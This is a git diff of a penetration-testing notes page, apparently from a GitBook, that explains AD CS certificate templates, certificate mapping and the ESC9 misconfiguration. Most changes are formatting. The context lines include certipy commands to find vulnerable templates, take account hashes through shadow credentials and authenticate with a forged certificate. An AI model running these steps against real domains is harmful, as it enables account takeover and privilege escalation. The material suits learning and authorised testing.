@@ -10,17 +10,17 @@ Active Directory Certificate Services (AD CS) is a Windows Server role for issui
 
 In short you can think of this as a way to prove identification very much like how a Kerberos ticket works. AD CS is a server role that functions as Microsoft’s public key infrastructure PKI implementation. Some key words:
 
-| Keyword                                           | Description                                                                                               |
-| ------------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
-| **PKI** (Public Key Infrastructure)               | a system to manage certificates/public key encryption                                                     |
-| **AD CS** (Active Directory Certificate Services) | Microsoft’s PKI implementation                                                                            |
-| **CA** (Certificate Authority)                    | PKI server that issues certificates                                                                       |
-| **Enterprise CA**                                 | CA integrated with AD (as opposed to a standalone CA)                                                     |
-| Certificate Template                              | collection of settings and policies that defines the contents of a certificate issued by an enterprise CA |
-| **CSR** (Certificate Signing Request)             | a message sent to a CA to request a signed certificate                                                    |
-| **EKU** (Extended/Enhanced Key Usage)             | object identifiers (OIDs) that define how a certificate can be used                                       |
+| Keyword                                            | Description                                                                                               |
+| -------------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
+| **PKI** (Public Key Infrastructure)                | a system to manage certificates/public key encryption                                                     |
+| **AD CS** (Active Directory Certificate Services)  | Microsoft’s PKI implementation                                                                            |
+| **CA** (Certificate Authority)                     | PKI server that issues certificates                                                                       |
+| **Enterprise CA**                                  | CA integrated with AD (as opposed to a standalone CA)                                                     |
+| Certificate Template                               | collection of settings and policies that defines the contents of a certificate issued by an enterprise CA |
+| **CSR** (Certificate Signing Request)              | a message sent to a CA to request a signed certificate                                                    |
+| **EKU** (Extended/Enhanced Key Usage)              |  object identifiers (OIDs) that define how a certificate can be used                                      |
 
-AD CS Enterprise CAs issue certificates with settings defined by AD objects known as certificate templates. A user can request a certificate based on a predefined certifcate template. These templates specifies the settings for the final certificate, like can it be used for authentication, what properties defined, who can enroll.
+AD CS Enterprise CAs issue certificates with settings defined by AD objects known as certificate templates. A user can request a certificate based on a predefined certifcate template. These templates specifies the settings for the final certificate, like can it be used for authentication, what properties defined, who can enroll.&#x20;
 
 ### <mark style="color:yellow;">Certifcate mapping</mark>
 
@@ -32,21 +32,21 @@ There have misconfigurations found in ESC1, ESC2, ESC3, ESC8, ESC9 and ESC10. Be
 
 #### Implicit mapping
 
-Here the information contained in the ceritificate's SAN or Subject Alternative Name is used to match the UPN attribute or `userPrincipalName` for a user or DNS `dNSHostName` for machine account. In case of a user account, the `otherName` component of the SAN is used, for machine `dNSName`.
+Here the information contained in the ceritificate's SAN or Subject Alternative Name is used to match the UPN attribute or `userPrincipalName` for a user or DNS `dNSHostName` for  machine account. In case of a user account, the `otherName` component of the SAN is used, for machine `dNSName`.
 
 If the UPN mapping fails the DC will attempt to match the username contained in `otherName` with `sAMAccountName` attribute, and then with `sAMAccountName` suffixed with `$`. Similar with DNS.
 
 #### Explicit mapping
 
-In case of explicit mapping, the altSecurityIdenties attribute of an account user or machine must contain identifiers of the certificates with which is authorised to authenticate. Certificate must be signed by a trusted certification authority, and match one of the values in `altSecurityidentities`.
+In case of explicit mapping, the altSecurityIdenties attribute of an account user or machine must contain identifiers of the certificates with which is authorised to authenticate. Certificate must be signed by a trusted certification authority, and match one of the values in `altSecurityidentities`.&#x20;
 
-<figure><img src="broken-reference" alt=""><figcaption><p>Source: The Hacker Recipes. Identifiers X509 v3 certificate</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption><p>Source: The Hacker Recipes. Identifiers X509 v3 certificate</p></figcaption></figure>
 
 Read more on Hacker Recipes about weak and strong mappings and labels.[https://www.thehacker.recipes/ad/movement/adcs/certificate-templates](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates)
 
 ### <mark style="color:yellow;">Example ESC9</mark>
 
-Microsoft has introduced the `CT_FLAG_NO_SECURITY_EXTENSION` flag for the `msPKI-Enrollment-Flag` attribute of certificate templates. If present, the CA will not include the user's SID when issuing certificates
+Microsoft has introduced the `CT_FLAG_NO_SECURITY_EXTENSION` flag for the `msPKI-Enrollment-Flag` attribute of certificate templates. If present, the CA will not include the user's SID when issuing certificates&#x20;
 
 {% hint style="info" %}
 Certipy will now check for ESC1, ESC2, ESC3, ESC4, and the new ESC9 on certificate templates.
@@ -63,9 +63,9 @@ Using certifpy we can search for vulnerabilities. ESC9 requirements:
 certipy find -u 'ca_operator' -p 'newP@ssword2022' -dc-ip 10.10.11.41 -vulnerable -stdout
 ```
 
-<figure><img src="broken-reference" alt=""><figcaption><p>Has no security extension.</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption><p>Has no security extension.</p></figcaption></figure>
 
-Get user hahes which [shadow-credentials.md](shadow-credentials.md "mention")or
+Get user hahes which [shadow-credentials.md](shadow-credentials.md "mention")or&#x20;
 
 ```bash
 certipy shadow auto -username "user1@$DOMAIN" -p "$PASSWORD" -account user2
@@ -94,3 +94,4 @@ Authenicate as user3 and get hashes
 ```bash
 certipy auth -pfx 'user3.pfx' -domain "$DOMAIN"
 ```
+
